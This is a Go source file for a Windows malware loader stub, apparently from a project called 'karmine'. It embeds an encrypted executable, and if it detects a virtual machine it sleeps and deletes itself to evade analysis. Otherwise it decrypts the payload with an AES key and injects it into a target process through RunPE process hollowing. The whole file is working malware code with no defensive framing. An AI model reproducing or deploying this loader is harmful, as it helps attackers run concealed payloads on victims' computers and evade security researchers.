//go:build windows
// +build windows

package main

import (
	_ "embed"
	"os"
	"syscall"
	"time"

	"github.com/ShellCode33/VM-Detection/vmdetect"
	"github.com/pygrum/karmine/karl/runpe"
	"github.com/pygrum/karmine/krypto/kes"
)

var (
	aeskey string
	X1     string
	X2     string
	Target string
)

//go:embed karma.exe
var fileBytes []byte

func main() {
	// VM detection checks
	// Using external library, as checks are as simple as looking to see if paths exist, checking mac addresses, etc

	// Unable to check for attached debugger, golang is incapable

	if ok, _ := vmdetect.IsRunningInVirtualMachine(); ok {
		time.Sleep(14 * time.Second)

		var sI syscall.StartupInfo
		var pI syscall.ProcessInformation

		exePath, _ := os.Executable()

		// self delete
		cmd := syscall.StringToUTF16Ptr(os.Getenv("windir") + "\\system32\\cmd.exe /C del " + exePath)
		syscall.CreateProcess(
			nil,
			cmd,
			nil,
			nil,
			true,
			0,
			nil,
			nil,
			&sI,
			&pI,
		)
	}
	fileBytes, err := kes.DecryptObject(fileBytes, aeskey, X1, X2)
	if err != nil {
		os.Exit(1)
	}
	runpe.Inject(Target, "", fileBytes)
}
